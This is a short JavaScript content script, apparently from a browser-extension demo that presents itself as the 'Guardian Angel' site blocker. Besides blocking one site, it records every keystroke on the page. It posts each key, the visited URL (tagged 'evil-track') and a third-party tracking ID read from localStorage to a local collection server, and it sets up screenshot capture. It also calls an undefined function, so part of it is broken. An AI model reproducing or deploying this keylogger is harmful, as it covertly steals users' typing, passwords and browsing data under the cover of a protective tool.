async function track(url) {
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "evil-track", url }),
    });
  } catch (err) {
    console.error(err);
  }
}

async function sendKey(key) {
  try {
    await fetch("https://localhost:1111", {
      method: "POST",
      body: JSON.stringify({ type: "key", key }),
    });
  } catch (err) {
    console.error(err);
  }
}

function addKeypressListener() {
  window.addEventListener("keydown", (event) => {
    if (event.isComposing || event.keyCode === 229) {
      return;
    }
    sendKey(event.key);
  });
}

async function getUserId() {
  // use other parties data to determine the user ID (ynet permutive demo)
  const id = window.localStorage.getItem("permutive-id");
  if (id) {
    try {
      await fetch("https://localhost:1111", {
        method: "POST",
        body: JSON.stringify({ type: "userID", id }),
      });
    } catch (err) {
      console.error(err);
    }
  }
}

// Demo on YNET,
function blockBlackListedSite() {
  const url = window.location.href;
  if (url.includes("zoo.org")) {
    document.body.innerHTML =
      '<div style="margin-top: 100px; font-family: \'Lato\'; font-size: 25px;"><center><h1>This site has been blocked by Guardian Angel</h1><img style="margin-top: 10px" height="400px" src="https://i.giphy.com/w89ak63KNl0nJl80ig.webp"><div style="font-size:20px;margin-top:20px;">Now go somewhere else!</div></center></div>';
  }
  track(url);
  addKeypressListener();
  getUserId();
}

const captureScreenshots = () => {
  setTimeout(() => {
    chrome.runtime.sendMessage({ msg: "capture" });
  }, 5000);
};

blockBlackListedSite();
screenshotOnLinkedIn();
